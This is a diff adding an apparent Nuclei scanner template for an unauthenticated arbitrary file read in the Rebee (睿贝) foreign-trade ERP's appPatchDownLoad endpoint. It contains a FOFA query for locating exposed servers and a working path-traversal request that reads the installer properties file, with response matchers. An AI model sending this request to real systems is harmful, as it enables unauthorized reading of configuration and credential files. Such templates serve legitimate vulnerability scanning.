@@ -1,0 +1,33 @@
+id: ruibeiwaimaoERP-appPatchDownLoad-File-reading
+
+info:
+  name: "睿贝外贸ERP appPatchDownLoad 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="loginNeedMobileNumVerification" || body="睿贝软件"
+    睿贝外贸ERP系统appPatchDownLoad接口存在任意文件读取安全缺陷，攻击者无需身份验证即可通过构造恶意请求读取服务器任意路径文件。该漏洞允许攻击者获取数据库连接字符串、系统配置参数等敏感信息，可能进一步导致横向渗透攻击和数据泄露风险。
+  reference:
+  - https://mp.weixin.qq.com/s/K2eSwCuNYchpm15b70lb1Q
+  tags: 睿贝外贸ERP
+
+
+http:
+- raw:
+  - |
+    GET /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'DESKTOP='
+    - 'DEPENDENCY_SUCCESSES='
+    - 'DEPENDENCY_REPORT='
+    - 'INSTALLER_JDK_HOME='
+    condition: and
+  - type: status
+    status:
+    - 200
